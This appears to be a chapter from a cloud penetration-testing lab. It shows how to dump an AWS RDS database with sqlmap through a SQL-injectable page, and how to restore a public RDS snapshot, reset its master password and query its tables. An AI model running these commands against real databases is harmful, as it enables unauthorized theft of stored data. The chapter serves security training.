# Data pilferage

## Introduction

Once access to an RDS instance is obtained, either through a standard terminal due to the availability of a password or through a vulnerability in an application that talks to an RDS, it is almost second nature for an attacker to dump data from the database.

Multiple tools are available that allow you to pilfer data through an application via a vulnerbaility like SQL Injection. The AWS console and cli also provide the ability to find and mount RDS snapshots. A password reset on these snapshots can then be used to obtain access to the data they store.

## What are we going to cover?

In this chapter we shall see how we can use tools like SQLmap to dump data from a vulnerable application. We shall also see how we can use the aws cli and the Amazon API to restore an RDS snapshot into an instance and then gain access to the data that it contains.

## Steps to attack

### Attack 1 - Dumping entire RDS database using SQLMap

We will dump all the data from the vulnerable application using SQLMap

First let's confirm if the application is reachable

    curl http://INTERNAL-IP-APP/guestsearch.php?search=

Next we fire up SQLMap and attack the vulnerable parameter. Remember this data is coming from the RDS which is a different asset than the AWS EC2 instance running the web application

    sqlmap  -u http://INTERNAL-IP-APP/guestsearch.php?search= -p search --dump-all --batch

### Attack 2 - Stealing from RDS Snapshots

RDS snapshots can be made public. If the full snapshot identifier is available, this snapshot can be mounted in your own instance.

Partial snapshot identifiers can be searched from the AWS console

    aws rds describe-db-snapshots --include-public --snapshot-type public --db-snapshot-identifier arn:aws:rds:us-east-1:159236164734:snapshot:globalbutterdbbackup
 
Once the snapshot is found, let's restore the snapshot as a new instance

    aws rds restore-db-instance-from-db-snapshot --db-instance-identifier recoverdb --publicly-accessible --db-snapshot-identifier arn:aws:rds:us-east-1:159236164734:snapshot:globalbutterdbbackup --availability-zone us-east-1b

Once the snapshot is restored, we will check if the instance has been created so that we can connect to it

    aws rds describe-db-instances --db-instance-identifier recoverdb

You may have to wait for sometime as the instance is backed up after creation. The status when you run describe-db-instances tells you whether the instance is available or backing-up. The value of "DBInstanceStatus" should read "available".

Finally, we will reset the credentials of the MasterUsername and login into the instance

    aws rds modify-db-instance --db-instance-identifier recoverdb --master-user-password NewPassword1 --apply-immediately

This operation also takes some time. You can check the status of the RDS instance by running the `aws rds describe-db-instances` covered above

Run the following command from the cloudhacker machine to see if the MySQL RDS is up and accesible

    nc rds-endpoint 3306 -zvv

If the endpoint is not visible, then the port 3306 will have to be opened on the Security Group for the instance.

- In RDS console, click on the recoverdb instance
- Click on the Security Group
- Add an Inbound rule for port 3306 TCP for Cloudhacker IP
    
Connect to the endpoint using the mysql client command

    mysql -u <username> -p -h <rds-instance-endpoint>

Once you are connected using the mysql client, you can pilferage data

    show databases;

    use globalbutter;

    show tables;

    select * from employees;

## Additional references

- [AWS cli from DB snapshot](https://docs.aws.amazon.com/cli/latest/reference/rds/restore-db-instance-from-db-snapshot.html)
- [AWS cli Modify DB Instance](https://docs.aws.amazon.com/cli/latest/reference/rds/modify-db-instance.html)
- [Restoring from Snapshot](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/CHAP_Tutorials.RestoringFromSnapshot.html)